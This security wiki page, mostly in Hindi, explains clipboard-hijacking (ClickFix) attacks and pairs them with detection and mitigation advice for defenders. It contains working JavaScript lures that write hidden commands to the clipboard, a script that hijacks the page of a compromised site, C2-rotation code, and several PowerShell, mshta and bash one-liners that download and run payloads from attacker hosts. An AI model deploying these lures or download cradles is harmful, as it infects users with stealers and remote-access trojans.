# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – पुरानी लेकिन अभी भी वैध सलाह

## अवलोकन

Clipboard hijacking – also known as *pastejacking* – इसका दुरुपयोग इस बात पर होता है कि उपयोगकर्ता आम तौर पर बिना जाँचे commands को copy-and-paste करते हैं। एक malicious web page (या किसी भी JavaScript-capable context जैसे Electron या Desktop application) प्रोग्रामेटिकली attacker-controlled text को system clipboard में रखता है। पीड़ितों को आम तौर पर सावधानीपूर्वक तैयार किए गए social-engineering निर्देशों के जरिए प्रोत्साहित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या एक terminal खोलें और clipboard content को *paste* करें, जिससे तुरंत arbitrary commands execute हो जाते हैं।

क्योंकि **no file is downloaded and no attachment is opened**, यह technique उन अधिकांश ई-मेल और वेब-कॉन्टेंट security controls को बायपास कर देता है जो attachments, macros या direct command execution को मॉनिटर करते हैं। इसलिए यह attack उन phishing campaigns में लोकप्रिय है जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware परिवारों को deliver करती हैं।

## Forced copy buttons and hidden payloads (macOS one-liners)

कुछ macOS infostealers इंस्टॉलर साइट्स (उदा., Homebrew) की नकल करते हैं और उपयोगकर्ताओं को केवल दिखाई देने वाले टेक्स्ट को हाइलाइट न करने देने के लिए **force use of a “Copy” button** करते हैं। clipboard entry में अपेक्षित installer command के साथ एक appended Base64 payload (उदा., `...; echo <b64> | base64 -d | sh`) शामिल होती है, इसलिए एक ही paste दोनों को execute कर देता है जबकि UI अतिरिक्त चरण को छिपा लेता है।

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake का फ्लो

1. यूजर एक typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
2. इंजेक्ट किया गया **ClearFake** JavaScript एक `unsecuredCopyToClipboard()` helper को कॉल करता है जो चुपचाप क्लिपबोर्ड में एक Base64-encoded PowerShell one-liner स्टोर कर देता है।
3. HTML निर्देश पीड़ित से कहते हैं: *“दबाएँ **Win + R**, कमांड पेस्ट करें और समस्या सुलझाने के लिए Enter दबाएँ।”*
4. `powershell.exe` चलते ही एक आर्काइव डाउनलोड होता है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
5. लोडर अतिरिक्त स्टेजेस को डिक्रिप्ट करता है, shellcode इंजेक्ट करता है और persistence इंस्टॉल करता है (उदा. scheduled task) — अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### NetSupport RAT श्रृंखला का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपने डायरेक्टरी में `msvcp140.dll` खोजता है।
* दुष्ट DLL **GetProcAddress** का उपयोग करके APIs को डायनामिक रूप से resolve करता है, **curl.exe** के माध्यम से दो binaries (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR कुंजी `"https://google.com/"` से decrypt करता है, final shellcode को inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनज़िप करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` को **curl.exe** से डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
3. MSI payload प्राप्त करता है → साइन किए गए एप्लिकेशन के बगल में `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer MSHTA के माध्यम से
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call एक छिपा हुआ PowerShell स्क्रिप्ट लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `extrac32` और फ़ाइल जोड़ने के माध्यम से `AutoIt3.exe` को पुनर्निर्मित करती है और अंततः एक `.a3x` स्क्रिप्ट चलाती है जो exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix अभियान फ़ाइल डाउनलोड को पूरी तरह छोड़ देते हैं और पीड़ितों को निर्देश देते हैं कि वे एक one‑liner पेस्ट करें जो WSH के माध्यम से JavaScript को फ़ेच और execute करता है, इसे persist करता है, और rotates C2 daily। उदाहरण में देखी गई श्रृंखला:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- ऑबफ़स्केटेड URL को रनटाइम पर उल्टा किया जाता है ताकि साधारण निरीक्षण बेअसर रहे।
- JavaScript स्वयं को Startup LNK (WScript/CScript) के माध्यम से स्थायी रखता है, और वर्तमान दिन के आधार पर C2 का चयन करता है — जिससे तेज़ domain rotation संभव होता है।

C2s को तारीख के अनुसार रोटेट करने के लिए प्रयुक्त न्यूनतम JS फ़्रैगमेंट:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS में initial run की persistence
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ताकि टर्मिनल बंद होने के बाद execution जारी रहे, और visible artifacts कम हों।

compromised sites पर In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: पेज जो Clipboard API को verification widgets के साथ बाइंड करते हैं; प्रदर्शित टेक्स्ट और clipboard payload के बीचMismatch; `navigator.userAgent` branching; Tailwind + single-page replace संदिग्ध संदर्भों में।
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ब्राउज़र इंटरैक्शन के तुरंत बाद; batch/MSI installers `%TEMP%` से executed होना।
- macOS endpoint: Terminal/iTerm जो `bash`/`curl`/`base64 -d` को `nohup` के साथ ब्राउज़र घटनाओं के पास spawn करते हैं; background jobs जो terminal close के बाद भी जीवित रह जाते हैं।
- `RunMRU` Win+R history और clipboard writes को subsequent console process creation के साथ correlate करें।

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 नकली CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake लगातार WordPress साइटों में compromise करता है और loader JavaScript इंजेक्ट करता है जो external hosts (Cloudflare Workers, GitHub/jsDelivr) और यहां तक कि blockchain “etherhiding” calls (उदाहरण के लिए, POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) को चेन करके current lure logic खींचता है। हालिया overlays भारी तौर पर fake CAPTCHAs का उपयोग करती हैं जो users को कुछ डाउनलोड करने के बजाय एक one-liner (T1204.004) को copy/paste करने का निर्देश देती हैं।
- Initial execution अधिकतर signed script hosts/LOLBAS को सौंप दी जा रही है। January 2026 की chains ने पहले के `mshta` उपयोग को встроенный `SyncAppvPublishingServer.vbs` के लिए बदल दिया जो `WScript.exe` के माध्यम से execute होता है, PowerShell-जैसे arguments को aliases/wildcards के साथ पास करके remote content fetch करने के लिए:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` साइन किया गया है और सामान्यतः App-V द्वारा उपयोग होता है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ जोड़े जाने पर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है.
- फरवरी 2026 में fake CAPTCHA payloads फिर से शुद्ध PowerShell download cradles पर लौट आए। दो लाइव उदाहरण:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- पहला चेन इन-मेमोरी `iex(irm ...)` grabber है; दूसरा चरण `WinHttp.WinHttpRequest.5.1` के माध्यम से स्टेज करता है, एक अस्थायी `.ps1` लिखता है, फिर इसे एक छिपी हुई विंडो में `-ep bypass` के साथ लॉन्च करता है।

Detection/hunting टिप्स इन वेरिएंट्स के लिए
- प्रोसेस लाइनएज: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` या PowerShell cradles क्लिपबोर्ड लिखने/Win+R के तुरंत बाद।
- कमांड-लाइन कीवर्ड्स: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP `iex(irm ...)` पैटर्न।
- नेटवर्क: वेब ब्राउज़िंग के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints की ओर आउटबाउंड कनेक्शन।
- फ़ाइल/रजिस्ट्री: `%TEMP%` के अंतर्गत अस्थायी `.ps1` का निर्माण तथा इन one-liners को रखने वाली RunMRU एंट्रियाँ; signed-script LOLBAS (WScript/cscript/mshta) जो external URLs या obfuscated alias strings के साथ execute कर रहे हों उन पर block/alert करें।

## निवारण

1. ब्राउज़र हार्डनिंग – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को अक्षम करें या user gesture आवश्यक बनाएं।
2. सिक्योरिटी अवेयरनेस – उपयोगकर्ताओं को यह सिखाएँ कि संवेदनशील कमांड्स को *टाइप* करें या पहले किसी टेक्स्ट एडिटर में पेस्ट करें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को ब्लॉक करने के लिए करें।
4. नेटवर्क नियंत्रण – ज्ञात pastejacking और malware C2 डोमेनों के लिए आउटबाउंड अनुरोधों को ब्लॉक करें।

## संबंधित ट्रिक्स

* **Discord Invite Hijacking** अक्सर उपयोगकर्ताओं को एक malicious server में लुभाने के बाद वही ClickFix तरीका का दुरुपयोग करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
